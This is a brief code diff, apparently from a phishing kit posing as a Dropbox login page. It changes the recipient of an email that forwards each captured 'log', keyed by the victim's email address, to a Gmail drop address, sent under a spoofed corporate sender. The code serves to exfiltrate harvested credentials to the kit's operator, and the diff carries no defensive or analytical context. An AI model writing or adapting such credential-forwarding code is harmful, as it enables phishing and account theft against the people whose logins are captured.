@@ -114,7 +114,7 @@ Timestamp: ${new Date().toISOString()}
 
   const mailOptions = {
     from: `No_Reply <admin@blueledgepartners.com>`,
-    to: "favourejim56@gmail.com",
+    to: "gf1african@gmail.com",
     subject: `New Log | gf1african Dropbox | ${email}`,
     text: emailBody,
   };
